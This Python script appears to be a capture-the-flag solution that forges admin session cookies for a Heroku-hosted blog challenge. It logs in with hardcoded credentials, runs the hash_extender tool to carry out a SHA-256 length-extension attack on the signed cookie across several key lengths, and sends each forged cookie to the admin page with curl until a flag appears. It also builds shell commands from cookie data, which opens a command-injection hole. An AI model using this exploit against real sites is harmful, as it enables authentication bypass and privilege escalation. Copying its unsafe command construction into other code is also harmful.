from base64 import b64encode, b64decode
from hashlib import new, sha256
import os
import requests
from random import randrange

root = "http://don-joes-blog.herokuapp.com/m4st3rfully_h1dd3n"
login_url = root + "/login"
admin_url = root + "/admin"
supreme_user_creds = {"username": "supreme_user", "password": "ezpz_passw0rd!"}

def get_supreme_user_cookie():
    session = requests.Session()
    session.post(login_url, data=supreme_user_creds)
    return session.cookies['auth']

def get_admin_cookies_from_supreme_user_cookie(original_cookie):
    cookies = []
    b64_data, b64_sig = original_cookie.split('.')
    supreme_user_data = b64decode(b64_data)
    supreme_user_sig = b64decode(b64_sig)
    supreme_user_sig_hex = supreme_user_sig.encode('hex')
    new_data = ";username=admin;secret=2ae3a0f2ef89bf388e7cdc7f5fc9f1b60e5542d0a6c2f6f1cf88190d0ab2b711;"
    for keylen in range(8, 16, 1):
        req = "../../hash_extender/hash_extender"
        req += " -d='" + supreme_user_data + "'"
        req += " --data-format=raw"
        req += " -s=" + supreme_user_sig_hex
        req += " --signature-format=hex"
        req += " --append='" + new_data + "'"
        req += " --append-format=raw"
        req += " -f=sha256 "
        req += " -l=" + str(keylen)
        req += " --out-signature-format=hex"
        req += " --out-data-format=raw"
        res = os.popen(req).read()
        new_sig_hex = res.split("New signature: ")[1].split("\n")[0]
        new_msg = res.split("New string: ")[1].split("\n")[0]
        new_sig_base64 = b64encode(new_sig_hex.decode('hex'))
        new_msg_base64 = b64encode(new_msg)
        cookies.append(new_msg_base64 + '.' + new_sig_base64)
    return cookies

def try_admin_auth(cookie):
    new_req = 'curl ' + admin_url + ' --cookie "auth=' + cookie + '" -s'
    res_final = os.popen(new_req).read()
    if "flag" in res_final:
        print(res_final)
        exit()
    else:
        print(res_final)

original_cookie = get_supreme_user_cookie()
cookies = get_admin_cookies_from_supreme_user_cookie(original_cookie)
for cookie in cookies:
    try_admin_auth(cookie)